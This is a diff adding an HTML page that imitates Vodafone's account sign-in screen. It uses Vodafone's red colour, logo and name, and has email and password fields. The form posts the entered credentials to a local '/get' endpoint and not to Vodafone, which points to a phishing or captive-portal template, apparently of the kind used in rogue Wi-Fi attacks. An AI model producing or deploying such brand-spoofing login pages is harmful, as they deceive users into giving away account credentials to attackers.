@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #6C429C;
+}
+
+.vodafone-name {
+  font-size: 42px;
+  color: #E60000;
+  margin-left: 0px;
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #E60000;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 1px solid #E60000;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #E60000;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+.submit-btn:hover {
+  background: #E60000;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="50.000000pt" height="50.000000pt" viewBox="0 0 900.000000 900.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,900.000000) scale(0.100000,-0.100000)"
+fill="#E60000" stroke="none">
+<path d="M4130 8945 c-932 -77 -1814 -444 -2530 -1054 -117 -100 -354 -335
+-460 -456 -99 -114 -284 -356 -352 -460 -72 -110 -138 -215 -138 -219 0 -2
+-22 -41 -48 -87 -43 -74 -139 -266 -185 -369 -113 -250 -228 -612 -287 -899
+-144 -710 -111 -1496 92 -2166 226 -748 600 -1371 1149 -1912 170 -167 277
+-259 456 -394 1001 -751 2240 -1039 3503 -814 531 95 1127 334 1600 643 266
+173 514 377 747 613 167 170 260 277 393 454 184 245 302 439 440 720 300 613
+450 1265 450 1955 0 547 -92 1055 -281 1562 -229 614 -575 1146 -1050 1615
+-341 335 -670 574 -1097 795 l-115 59 -51 -12 c-173 -40 -421 -148 -570 -248
+-405 -273 -684 -672 -792 -1131 -22 -94 -44 -281 -44 -375 l0 -81 73 -19 c98
+-25 374 -116 472 -155 321 -130 611 -316 831 -535 373 -371 567 -829 603
+-1428 43 -691 -210 -1349 -708 -1848 -312 -311 -661 -510 -1081 -615 -204 -50
+-322 -66 -558 -71 -232 -6 -357 6 -565 53 -362 82 -716 257 -1013 499 -143
+118 -321 302 -428 444 -75 100 -191 276 -203 308 -4 10 -16 34 -28 53 -12 19
+-43 81 -68 136 -152 333 -232 667 -256 1064 -58 957 360 1998 1099 2741 311
+312 643 552 1065 769 474 244 955 396 1475 466 131 18 590 26 660 12 74 -15
+-200 100 -390 165 -579 196 -1199 272 -1810 222z"/>
+</g>
+</svg>
+
+    <svg class="logo" xmlns="http://www.w3.org/2000/svg"></svg>
+    <div class="vodafone-name">Vodafone</div>
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in</h1>
+      <h2>Use your Vodafone Account</h2></center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+      
+      <button class="submit-btn" type="submit">Continue</button>
+    
+    </form>
+
+  </div>
+
+</div>
+
+</body>
+</html>
